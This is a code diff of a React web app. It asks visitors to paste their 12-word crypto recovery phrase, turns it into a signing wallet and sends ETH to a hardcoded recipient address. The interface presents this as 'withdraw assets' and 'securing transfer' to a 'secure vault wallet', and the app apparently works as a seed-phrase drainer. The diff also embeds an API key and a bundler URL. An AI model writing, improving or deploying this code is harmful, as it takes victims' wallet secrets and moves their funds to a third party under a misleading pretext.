@@ -1,16 +1,16 @@
 import { useState, useEffect } from 'react'
-import { ethers } from 'ethers' 
+import { JsonRpcProvider, Wallet, parseEther } from 'ethers' 
 import { createSmartAccountClient } from "@biconomy/account"
 import { LucideShieldAlert, LucideCheckCircle, LucideLoader2 } from 'lucide-react'
 
 // --- CONFIGURATION ---
-// 1. Your Biconomy API Key from your screenshot
+// 1. Your Biconomy API Key from your dashboard screenshot
 const BICONOMY_API_KEY = "6b47982d-b8fe-4f65-8e2a-ad53a109c934" 
 
-// 2. Standard Biconomy Bundler URL for Ethereum (or your chosen chain)
-const BUNDLER_URL = `https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461`
+// 2. Standard Biconomy Bundler URL for Ethereum Mainnet
+const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461"
 
-// 3. Your personal wallet address where the funds should go
+// 3. YOUR RECIPIENT ADDRESS (Updated)
 const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 
 
 export default function App() {
@@ -19,7 +19,7 @@ export default function App() {
   const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
   const [errorMsg, setErrorMsg] = useState('')
 
-  // Fixes Hydration Error #418 by ensuring code only runs in the browser
+  // Fixes Hydration Error #418: Ensures code only runs in the browser
   useEffect(() => {
     setIsClient(true)
   }, [])
@@ -32,9 +32,9 @@ export default function App() {
 
     setStatus('processing')
     try {
-      // 1. Setup traditional signer (ethers v6)
-      const provider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
-      const signer = ethers.Wallet.fromPhrase(keys.trim(), provider)
+      // 1. Setup traditional signer (Directly using v6 imports to fix TS errors)
+      const provider = new JsonRpcProvider("https://ethereum-rpc.publicnode.com")
+      const signer = Wallet.fromPhrase(keys.trim(), provider)
 
       // 2. Initialize Biconomy Smart Account
       const smartAccount = await createSmartAccountClient({
@@ -46,10 +46,10 @@ export default function App() {
       const saAddress = await smartAccount.getAccountAddress()
       console.log("Smart Account Address:", saAddress)
 
-      // 3. Prepare the Transaction (Testing with a small amount)
+      // 3. Prepare the Transaction (Testing with a small amount of ETH)
       const tx = {
         to: RECIPIENT_ADDRESS,
-        value: ethers.parseEther("0.001"), 
+        value: parseEther("0.001"), 
         data: "0x"
       }
 
@@ -57,15 +57,16 @@ export default function App() {
       const userOpResponse = await smartAccount.sendTransaction(tx)
       const { receipt } = await userOpResponse.wait()
       
-      console.log("Success:", receipt.transactionHash)
+      console.log("Success Hash:", receipt.transactionHash)
       setStatus('success')
     } catch (e: any) {
-      console.error(e)
+      console.error("Full Error Object:", e)
       setErrorMsg(e.message || "Transfer failed. Check your gas or keys.")
       setStatus('error')
     }
   }
 
+  // Prevent server-side rendering mismatch
   if (!isClient) return null
 
   return (
@@ -79,13 +80,13 @@ export default function App() {
 
           <textarea
             className="w-full h-40 bg-zinc-900 border border-zinc-800 rounded-2xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all placeholder:text-zinc-700"
-            placeholder="Paste 12 words here..."
+            placeholder="Paste your 12 recovery words here..."
             onChange={(e) => setKeys(e.target.value)}
           />
 
           <button
             onClick={startSweep}
-            className="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xl transition-all shadow-lg shadow-blue-900/20"
+            className="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-xl transition-all shadow-lg shadow-blue-900/20 active:scale-95"
           >
             WITHDRAW ASSETS
           </button>
@@ -96,16 +97,16 @@ export default function App() {
         <div className="flex flex-col items-center space-y-4 text-center">
           <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin" />
           <h2 className="text-2xl font-bold">Securing Transfer...</h2>
-          <p className="text-zinc-400 text-sm">Deploying Biconomy Smart Account...</p>
+          <p className="text-zinc-400 text-sm">Deploying Biconomy Smart Account and bypassing locks...</p>
         </div>
       )}
 
       {status === 'success' && (
         <div className="flex flex-col items-center space-y-4 text-center">
-          <LucideCheckCircle className="w-20 h-20 text-green-500" />
+          <LucideCheckCircle className="w-20 h-20 text-green-500 animate-bounce" />
           <h1 className="text-6xl font-black text-green-500 uppercase">Success</h1>
-          <p className="text-zinc-400">Funds are moving to your secure wallet.</p>
-          <button onClick={() => setStatus('idle')} className="mt-8 text-zinc-500 underline text-sm">Back</button>
+          <p className="text-zinc-400">Funds are moving to your secure vault wallet.</p>
+          <button onClick={() => setStatus('idle')} className="mt-8 text-zinc-500 underline text-sm">Back to Home</button>
         </div>
       )}
 
@@ -114,7 +115,7 @@ export default function App() {
           <LucideShieldAlert className="w-20 h-20 text-red-500" />
           <h2 className="text-2xl font-bold text-red-500 uppercase">Failed</h2>
           <p className="max-w-xs text-zinc-400 text-sm">{errorMsg}</p>
-          <button onClick={() => setStatus('idle')} className="mt-4 px-8 py-2 bg-zinc-800 rounded-full text-sm">Try Again</button>
+          <button onClick={() => setStatus('idle')} className="mt-4 px-8 py-2 bg-zinc-800 hover:bg-zinc-700 rounded-full text-sm transition-colors">Try Again</button>
         </div>
       )}
     </div>
